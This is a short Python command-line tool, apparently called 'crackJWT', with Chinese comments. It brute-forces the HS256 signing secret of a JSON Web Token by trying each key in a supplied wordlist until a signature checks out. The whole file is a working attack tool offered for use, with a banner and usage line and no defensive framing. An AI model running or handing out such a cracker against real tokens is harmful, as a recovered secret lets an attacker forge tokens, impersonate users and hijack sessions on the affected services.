#!/usr/bin/env python 3
# -*- coding: utf-8 -*-

import sys
import jwt
import termcolor
from colorama import init


init(autoreset=True)
def check_input():
    """检查输入"""
    if len(sys.argv) != 3:
        print("Usage: "+sys.argv[0]+" jwt_str"+" passwd.txt")
        exit(1)


def print_sign():
    BANNER = r"""   
                              _        ___  _    _  _____ 
                             | |      |_  || |  | ||_   _|
      ___  _ __   __ _   ___ | | __     | || |  | |  | |  
     / __|| '__| / _` | / __|| |/ /     | || |/\| |  | |  
    | (__ | |   | (_| || (__ |   <  /\__/ /\  /\  /  | |  
     \___||_|    \__,_| \___||_|\_\ \____/  \/  \/   \_/  
                                                          (v 1.1)                                               
    """
    print(BANNER)


def crack_key():
    """爆破jwt秘钥"""
    jwt_str = sys.argv[1]
    passwd = sys.argv[2]
    with open(passwd) as f:
        for line in f:
            key = line.strip()
            try:
                jwt.decode(jwt_str,verify=True,key=key, algorithms=['HS256']).decode('utf-8')
                print(termcolor.colored(r"[+]","green"),"found key successfully-->",termcolor.colored(key,"green"))
                break
            except (
                    jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,
                    jwt.exceptions.InvalidIssuedAtError,
                    jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError
            ):
                print(r"[+] found key successfully!!!  -->",termcolor.colored(key,"green"))
                break
            except jwt.exceptions.InvalidSignatureError:
                print(r"[-] try key -->", key)
                continue
        else:
            print(r"[+] Done! no key was found\n")


if __name__ == '__main__':
    check_input()
    print_sign()
    crack_key()
